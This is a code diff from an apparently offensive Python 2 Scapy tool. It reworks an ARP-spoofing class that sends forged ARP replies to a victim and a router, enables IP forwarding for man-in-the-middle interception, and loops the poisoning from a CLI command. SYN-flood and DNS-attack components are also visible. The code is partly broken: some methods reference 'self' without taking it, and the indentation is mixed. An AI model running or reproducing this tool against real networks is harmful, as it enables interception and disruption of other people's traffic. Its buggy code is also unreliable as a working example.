@@ -45,7 +45,11 @@ def arp_monitor_callback(pkt):
 	
 class Arp:
 #    def __init__(self, victim 
-    routerIP = victimIP = routerMAC= victimMAC = None
+    def __init__(self, routerIP, victimIP, routerMAC, victimMAC):
+	self.routerIP = routerIP
+	self.victimIP = victimIP
+	self.routerMAC = routerMAC
+	self.victimMAC = victimMAC
 
     def originalMAC(ip):
         ans,unans = srp(ARP(pdst=ip), timeout=5, retry=3)
@@ -53,18 +57,18 @@ class Arp:
             return r[Ether].src
         
     def poison(self, routerIP, victimIP, routerMAC, victimMAC):
-        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))#TODO error
-        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
+        send(ARP(op=2, pdst=self.victimIP, psrc=self.routerIP, hwdst=self.victimMAC))#TODO error
+        send(ARP(op=2, pdst=self.routerIP, psrc=self.victimIP, hwdst=self.routerMAC))
     
     def restore(routerIP, victimIP, routerMAC, victimMAC):
-        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
-        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
+        send(ARP(op=2, pdst=self.routerIP, psrc=self.victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.victimMAC), count=3)
+        send(ARP(op=2, pdst=self.victimIP, psrc=self.routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.routerMAC), count=3)
         sys.exit("losing...")    
 
    # def signal_handler(signal, frame):
    #     with ipf as open('/proc/sys/net/ipv4/ip_forward', 'w'):#TODO compile error
    #         ipf.write('0\n')#disable IP forwarding
-        restore(routerIP, victimIP, routerMAC, victimMAC)
+        restore(self.routerIP, self.victimIP, self.routerMAC, self.victimMAC)
         
 
 class sendSYN(threading.Thread):
@@ -179,17 +183,21 @@ class CLI(cmd.Cmd):
 		ipf.write('1\n')#enable IP forwarding with '1'     
 	    #signal.signal(signal.SIGINT, signal_handler)
 	    
-	    arpAttack = Arp()       
+	
+	    routerIP = arplist[0]
+	    victimIP = arplist[1]	    
+	    routerMAC = arplist[2]	    
+	    victimMAC = arplist[3]
+	       
+	    arpAttack = Arp(routerIP, victimIP, routerMAC, victimMAC)       
 
-	    arplist[0] = arpAttack.routerIP
-	    arplist[1] = arpAttack.victimIP
-	    arplist[2] = arpAttack.routerMAC
-	    arplist[3] = arpAttack.victimMAC
-	    
 	    while 1:
-		arpAttack.poison(arpAttack.routerIP, arpAttack.victimIP, arpAttack.routerMAC, arpAttack.victimMAC)
-		time.sleep(1.5)
-	        
+		try:
+		    arpAttack.poison(arpAttack.routerIP, arpAttack.victimIP, arpAttack.routerMAC, arpAttack.victimMAC)
+		    time.sleep(1.5)
+		except KeyboardInterrupt:
+		    print "\n"
+		    break
 	       
 	
     def do_dns(self, arg):
